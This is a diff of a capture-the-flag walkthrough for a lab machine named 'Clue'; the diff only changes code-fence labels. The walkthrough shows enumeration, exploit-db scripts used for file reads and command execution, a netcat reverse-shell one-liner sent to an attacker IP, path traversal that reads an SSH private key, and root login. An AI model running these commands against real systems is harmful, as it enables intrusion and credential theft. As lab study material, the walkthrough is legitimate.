@@ -3,7 +3,7 @@
 # 🐧Clue🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.156.240           
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 19:55 AEDT
 Nmap scan report for 192.168.156.240
@@ -18,7 +18,7 @@ PORT     STATE SERVICE          VERSION
 8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
 ```
 Found 2 users in enum4linux
-```
+```console
 $ enum4linux -a 192.168.156.240
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                       
                                                                                                                   
@@ -29,14 +29,14 @@ port 3000 is hosting a Cassandra Web
 searchsploit and found a script can run remote file read  
 and we got the user cassie and password SecondBiteTheApple330  
 https://www.exploit-db.com/exploits/49362
-```
+```console
 $ python3 49362.py 192.168.156.240 /proc/self/cmdline
 /usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
 ```
 we know port 8021 is running Freeswitch  
 searchsploit found a command execution script  
 https://www.exploit-db.com/exploits/47799
-```
+```console
 cat 47799.txt
 # Exploit Title: FreeSWITCH 1.10.1 - Command Execution
 # Date: 2019-12-19
@@ -62,7 +62,7 @@ after a bit of research on goole
 it says the password location of this configuration file is   /etc/freeswitch/autoload_configs/event_socket.conf.xml    
 then we use remote file script to read the password  
 the passowrd is StrongClueConEight021  
-```
+```console
 $ python3 49362.py 192.168.156.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
 
 <configuration name="event_socket.conf" description="Socket Client">
@@ -75,10 +75,10 @@ $ python3 49362.py 192.168.156.240 /etc/freeswitch/autoload_configs/event_socket
 </configuration>
 ```
 change the password in the script and run it with reverse shell command
-```
+```console
 $ python3 47799.py 192.168.156.240 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 80 >/tmp/f"
 ```
-```
+```console
 $ nc -lvnp 80
 listening on [any] 80 ...
 connect to [192.168.45.157] from (UNKNOWN) [192.168.156.240] 48970
@@ -89,7 +89,7 @@ uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
 
 since we alreday know the password of cassie
 we can su to cassie
-```
+```console
 freeswitch@clue:/$ su cassie
 Password: SecondBiteTheApple330
 
@@ -97,7 +97,7 @@ cassie@clue:/$ id
 uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
 ```
 sudo -l and found cassie can run the cassandra-web with root
-```
+```console
 cassie@clue:/$ sudo -l
 Matching Defaults entries for cassie on clue:
     env_reset, mail_badpass,
@@ -108,7 +108,7 @@ User cassie may run the following commands on clue:
 ```
 so we are going to start a new cassandra session and login as root access to see sensetive file  
 we run another cassandra session in port 8021 and use the 47799.py script to login again as root access
-```
+```console
 cassie@clue:/home/anthony$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:8021 -u cassie -p SecondBiteTheApple330
 I, [2026-02-02T06:16:42.668428 #26588]  INFO -- : Establishing control connection
 I, [2026-02-02T06:16:42.745720 #26588]  INFO -- : Refreshing connected host's metadata
@@ -124,11 +124,11 @@ I, [2026-02-02T06:16:42.881092 #26588]  INFO -- : Session created
 2026-02-02 06:16:42 -0500 Maximum connections set to 1024
 2026-02-02 06:16:42 -0500 Listening on 0.0.0.0:4000, CTRL+C to stop
 ```
-```
+```console
 $ python3 47799.py 192.168.156.240 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 8021 >/tmp/f"
 ```
 got the shell and su to cassie again and we have root access now
-```
+```console
 $ nc -lvnp 8021
 listening on [any] 8021 ...
 connect to [192.168.45.157] from (UNKNOWN) [192.168.156.240] 48970
@@ -138,13 +138,13 @@ Password: SecondBiteTheApple330
 cassie@clue:/$
 ```
 we know there is another user anthony
-```
+```console
 cassie@clue:/home$ ls -la
 drwxr-xr-x  3 anthony anthony 4096 Aug  5  2022 anthony
 drwxr-xr-x  4 cassie  cassie  4096 Feb  2 05:47 cassie
 ```
 we can check the sensetive file like id_rsa
-```
+```console
 cassie@clue:/$ curl --path-as-is http://0.0.0.0:8021/../../../../../../../../../../home/anthony/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
@@ -177,7 +177,7 @@ iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
 then we use the id_rsa to ssh remote login  
 for some reason anthony is not allow to login via ssh
 but root is allow and we got it
-```
+```console
 $ ssh root@192.168.156.240 -i id_rsa
 
 Last login: Mon Feb  2 06:25:31 2026 from 192.168.45.157
